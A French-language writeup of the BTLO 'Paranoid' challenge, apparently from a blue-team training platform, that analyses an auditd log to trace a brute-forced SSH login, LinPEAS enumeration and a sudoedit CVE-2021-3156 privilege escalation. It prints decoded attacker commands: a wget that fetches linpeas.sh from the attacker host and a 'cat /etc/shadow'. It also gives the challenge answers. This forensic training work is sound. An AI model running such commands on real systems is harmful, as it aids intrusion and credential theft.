# 🔐 BTLO — Paranoid Writeup

<p align="center">
  <img src="https://img.shields.io/badge/Challenge-Paranoid-red?style=for-the-badge">
  <img src="https://img.shields.io/badge/Type-Auditd%20Log%20Analysis-blue?style=for-the-badge">
  <img src="https://img.shields.io/badge/Difficulty-Hard-orange?style=for-the-badge">
</p>

---

## 📋 Scenario

> none

### 📂 Fichiers fournis

    paranoid.zip/
    └── Challenge Files/
        └── audit.log

> ⚠️ PS: celui-là était relativement compliqué  

---

## 🧠 Questions

---

### 🧾 Question 1) What account was compromised?

| Élément | Valeur |
|--------|--------|
| Réponse | **btlo** |
| Outil | `aureport` |

j'ai donc utilisé aureport

    sudo aureport -if audit.log -au

-if,--input <Input File name>	use this file as input  
-au,--auth			Authentication report  

ce qui m'a donné de nombreuses réponses dont 

    89. 10/05/21 02:23:13 btlo 192.168.4.155 ssh /usr/sbin/sshd yes 467550
    90. 10/05/21 02:23:34 btlo ? /dev/pts/1 /usr/bin/sudo yes 468442

➡️ j'ai pu déduire dans la colonne host : **btlo**

---

### 💣 Question 2) What attack type was used to gain initial access?

| Élément | Valeur |
|--------|--------|
| Réponse | **Brute Force** |

j'ai donc utilisé aureport 

    aureport -if audit.log  

ce qui m'a donné de nombreuses réponses dont 

    Number of failed logins: 87
    Number of authentications: 3
    Number of failed authentications: 89

➡️ j'ai pu en déduire une attaque par **bruteforce**

---

### 🌐 Question 3) What is the attacker's IP address?

| Élément | Valeur |
|--------|--------|
| Réponse | **192.168.4.155** |

j'ai utilisé le résultat tiré de la commande pour la question 1 

    sudo aureport -if audit.log -au

    89. 10/05/21 02:23:13 btlo 192.168.4.155 ssh /usr/sbin/sshd yes 467550

➡️ IP attaquant identifiée

---

### 🛠️ Question 4) What tool was used to perform system enumeration?

| Élément | Valeur |
|--------|--------|
| Réponse | **LinPEAS** |

j'ai réutilisé une commande utilisée par l'attaquant 

    /usr/bin/wget pts1 192.168.4.155 1001 468454

j'ai donc repris l'event ID : 

    grep -A5 "468454" audit.log

ce qui m'a sorti le 

    proctitle=77676574002D4F002D00687474703A2F2F3139322E3136382E342E3135353A383030302F6C696E706561732E7368

je l'ai décodé avec cette commande 

    echo "77676574002D4F002D00687474703A2F2F3139322E3136382E342E3135353A383030302F6C696E706561732E7368" | xxd -r -p

et il m'a ressorti la commande utilisée en clair 

    wget -O - http://192.168.4.155:8000/linpeas.sh

➡️ Tool utilisé : **LinPEAS**

---

### 🔓 Question 5) What is the name of the binary and pid used to gain root?

| Élément | Valeur |
|--------|--------|
| Réponse | **evil,829992** |

ses=49 étant la session de l'attaquant j'ai cherché les événements sudo réussis avec leur PID 

    grep "ses=49" audit.log | grep "sudo" | grep "res=success"

➡️ ce qui m'a donné le PID du shell root : **829992**

par la suite j'ai utilisé cette commande : 

    grep -B5 "481036" audit.log | grep -E "EXECVE|PROCTITLE|exe="

elle me permet de grep tout ce qui se trouve avant l'event 481036 et  

"EXECVE|PROCTITLE|exe=" :  

- EXECVE : arguments de la commande  
- PROCTITLE : commande complète  
- exe= : chemin du binaire  

j'en ai tiré 

    proctitle=2E2F6576696C0030

et je l'ai décodé avec cette commande 

    echo "2E2F6576696C0030" | xxd -r -p

ce qui m'a donné 

    ./evil0

➡️ proctitle = **./evil0**

---

### 🧨 Question 6) What CVE was exploited to gain root access?

| Élément | Valeur |
|--------|--------|
| Réponse | **CVE-2021-3156** |

en faisant cette commande 

    grep -B5 "481036" audit.log | grep -E "EXECVE|PROCTITLE|exe="

j'ai pu observer 

    comm="sudoedit"

juste avant le shell root  

l'attaquant depuis tout à l'heure essaye d'escalader les privilèges  

ce qui m'a mené à ce site  
https://www.sentinelone.com/vulnerability-database/cve-2021-3156/  

puis je suis allé voir les détails sur ce site-là  
https://nvd.nist.gov/vuln/detail/cve-2021-3156  

---

### 🧠 Question 7) What type of vulnerability is this?

| Élément | Valeur |
|--------|--------|
| Réponse | **Heap-Based Buffer Overflow** |

mentionné ici  
https://nvd.nist.gov/vuln/detail/cve-2021-3156  
<img width="980" height="412" alt="Image" src="https://github.com/user-attachments/assets/3315d9a0-5025-46c6-9bec-74bfb7f1d450" />

---

### 📤 Question 8) What file was exfiltrated once root was gained?

| Élément | Valeur |
|--------|--------|
| Réponse | **/etc/shadow** |

    grep "481063" audit.log | grep "EXECVE" 

    type=EXECVE msg=audit(1633393670.675:481063): argc=2 a0="cat" a1="/etc/shadow"

➡️ fichier sensible exfiltré : **/etc/shadow**

---

## 🛠️ Outils utilisés

| Outil | Usage |
|------|------|
| aureport | Analyse auditd |
| grep | Filtrage |
| xxd | Décodage hex |
| wget | Téléchargement attaquant |
